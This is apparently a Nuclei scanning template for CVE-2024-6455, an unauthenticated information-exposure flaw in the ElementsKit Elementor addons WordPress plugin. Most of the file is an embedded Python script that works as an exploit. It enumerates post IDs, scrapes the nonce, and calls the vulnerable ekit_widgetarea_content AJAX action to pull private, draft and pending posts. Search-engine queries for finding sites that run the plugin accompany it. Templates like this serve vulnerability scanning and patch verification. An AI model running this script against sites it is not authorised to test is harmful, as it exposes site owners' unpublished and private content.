id: CVE-2024-6455

info:
  name: ElementsKit Elementor addons <= 3.2.0 - Unauthenticated Information Exposure via ekit_widgetarea_content Function
  author: Kazgangap
  severity: medium
  description: |
    The ElementsKit Elementor addons plugin for WordPress is vulnerable to Information Exposure in all versions up to, and including, 3.2.0 due to a missing capability checks on ekit_widgetarea_content function. This makes it possible for unauthenticated attackers to view any item created in Elementor, such as posts, pages and templates including drafts, pending and private items.
  reference:
    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/elementskit-lite/elementskit-elementor-addons-320-unauthenticated-information-exposure-via-ekit-widgetarea-content-function
    - https://nvd.nist.gov/vuln/detail/cve-2024-6455
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2024-6455
  metadata:
    vendor: Roxnor
    product: elementskit-lite
    framework: wordpress
    shodan-query: http.html:"/wp-content/plugins/elementskit-lite/"
    fofa-query: body="/wp-content/plugins/elementskit-lite"
    publicwww-query: /wp-content/plugins/elementskit-lite/
  tags: cve,cve2024,elementskit,wordpress,exposure,code

code:
  - engine:
      - py
      - python3

    source: |
      import requests
      import re
      import os
      from urllib.parse import urljoin

      class Exploit:
          def __init__(self, host, port):
              self.host = host
              self.port = port
              self.session = requests.Session()
              self.session.headers.update({
                  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
              })

          def run(self):
              host = self.host
              if not host.startswith("http://") and not host.startswith("https://"):
                   host = f"http://{host}"

              base_url = f"{host}:{self.port}"

              non_200_ids = []
              found_nonce = None

              # Phase 1: Discovery
              for post_id in range(0, 101):
                  url = urljoin(base_url, f"/?p={post_id}")
                  try:
                      res = self.session.get(url, allow_redirects=True, timeout=5)
                      
                      if not found_nonce and len(res.text) > 0:
                          patterns = [
                              r'"nonce"\s*:\s*"([a-f0-9]+)"',
                              r'ekit_config\s*=\s*\{[^}]*"nonce"\s*:\s*"([a-f0-9]+)"'
                          ]
                          for pattern in patterns:
                              match = re.search(pattern, res.text)
                              if match:
                                  found_nonce = match.group(1)
                                  print("nonce found!")
                                  break

                      if res.status_code != 200:
                          non_200_ids.append(post_id)

                  except:
                      non_200_ids.append(post_id)

              if not found_nonce:
                  return

              # Phase 2: Exploit
              ajax_url = urljoin(base_url, "/wp-admin/admin-ajax.php")
              
              for post_id in range(0, 101):
                  if post_id not in non_200_ids:
                      continue

                  data = {
                      "action": "ekit_widgetarea_content",
                      "nonce": found_nonce,
                      "post_id": post_id
                  }

                  try:
                      res = self.session.post(ajax_url, data=data, timeout=8)

                      if res.status_code == 200 and len(res.text) > 0:
                          print("private pages found!")
                          print(f"ID: {post_id} | Length: {len(res.text)}")

                  except:
                      pass
      if __name__ == "__main__":
         host = os.getenv("Host")
         port = os.getenv("Port")
         if host and port:
             Exploit(host, port).run()

    matchers:
      - type: word
        words:
          - "private pages found!"
